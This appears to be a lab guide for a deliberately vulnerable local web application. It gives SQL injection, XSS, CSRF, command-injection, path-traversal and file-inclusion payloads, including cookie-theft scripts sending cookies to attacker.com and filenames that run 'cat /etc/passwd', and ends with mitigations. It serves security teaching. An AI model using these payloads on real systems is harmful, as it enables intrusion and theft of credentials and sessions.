# Vulnerability Testing Guide

⚠️ **WARNING: These attacks are for educational purposes only** ⚠️

This guide documents all available vulnerabilities in the application and how to exploit them. Use this knowledge responsibly and only in controlled environments.

## 1. SQL Injection Attacks

### Login Bypass

```sql
# Basic login bypass
Username: admin' OR '1'='1
Password: anything

# Login as specific user
Username: admin'--
Password: anything

# Union-based injection
Username: ' UNION SELECT 1,'admin','admin123',1--
Password: anything
```

### Search Function Exploitation

```sql
# List all users
' OR '1'='1

# Union attack to get table information
' UNION SELECT sql,1,1 FROM sqlite_master--

# Extract user passwords
' UNION SELECT password,username,1 FROM user--
```

## 2. Cross-Site Scripting (XSS) Attacks

### Reflected XSS in Search

```javascript
# Basic alert
<script>alert('XSS')</script>

# Cookie theft
<script>fetch('http://attacker.com?cookie='+document.cookie)</script>

# Session hijacking
<script>new Image().src='http://attacker.com?cookie='+document.cookie;</script>
```

### Stored XSS via Username

```javascript
# Register with XSS payload as username
Username: <script>alert(document.cookie)</script>
Password: anything

# More advanced payload
Username: <img src=x onerror="alert(document.cookie)">
```

## 3. CSRF (Cross-Site Request Forgery)

The application has no CSRF protection. Create this HTML file and host it:

```html
<!-- save as csrf.html -->
<html>
  <body onload="document.forms[0].submit()">
    <form action="http://localhost:5001/login" method="POST">
      <input type="hidden" name="username" value="admin" />
      <input type="hidden" name="password" value="admin123" />
    </form>
  </body>
</html>
```

## 4. Default Credentials

```
Username: admin
Password: admin123
```

## 5. Information Disclosure

### Debug Mode

1. Cause an error by visiting: `/nonexistent`
2. Get detailed error traces and application info
3. Access the interactive debugger with the PIN shown in console

### Source Code Disclosure

1. Visit: `http://localhost:5001/console`
2. Use the debug console to explore the filesystem
3. Execute arbitrary Python code

## 6. Security Misconfigurations

### Hardcoded Secrets

- Application secret key: `very_secret_key_123`
- Located in `app.py`

### Insecure Database

- SQLite database in plaintext
- Located in `instance/vulnerable.db`
- No encryption for sensitive data

## 7. Authentication Flaws

### Password Storage

- Passwords stored in plaintext
- No salting or hashing
- Visible in database directly

### Session Management

- Predictable session cookies
- No secure flag
- No HTTPOnly flag

## 8. Injection Points for Testing

### URL Parameters

```
/search?q=[INJECTION_POINT]
```

### Form Fields

```
/login
- username field
- password field
```

### Headers

```
# Try injecting in these headers
Cookie: session=[INJECTION_POINT]
User-Agent: [INJECTION_POINT]
X-Forwarded-For: [INJECTION_POINT]
```

## 9. Advanced Attacks

### Command Injection (if file upload is added)

```
# Filename with command injection
file.jpg;ls -la
file.jpg|cat /etc/passwd
```

### Path Traversal

```
# Try accessing files outside web root
../../../etc/passwd
..\..\windows\system.ini
```

### Local File Inclusion

```
# If implemented in future updates
/view?file=../../../../etc/passwd
/view?file=php://filter/convert.base64-encode/resource=index.php
```

## 10. Tools for Testing

1. **Web Proxies**

   - Burp Suite
   - OWASP ZAP
   - Charles Proxy

2. **SQL Injection**

   - SQLmap
   - sqlninja

3. **XSS Testing**

   - XSSer
   - BeEF (Browser Exploitation Framework)

4. **General Testing**
   - Nikto
   - Nmap
   - Metasploit

## 11. Mitigation Strategies

For each vulnerability, here's how it should be fixed in a real application:

1. **SQL Injection**

   - Use parameterized queries
   - Input validation
   - ORM with proper escaping

2. **XSS**

   - Input sanitization
   - Content Security Policy (CSP)
   - Output encoding

3. **CSRF**

   - CSRF tokens
   - SameSite cookies
   - Origin validation

4. **Authentication**

   - Strong password hashing (bcrypt/Argon2)
   - Secure session management
   - MFA implementation

5. **Configuration**
   - Remove debug mode in production
   - Secure secret management
   - Proper error handling

Remember: This is a deliberately vulnerable application for learning. Never implement these vulnerabilities in a real application!
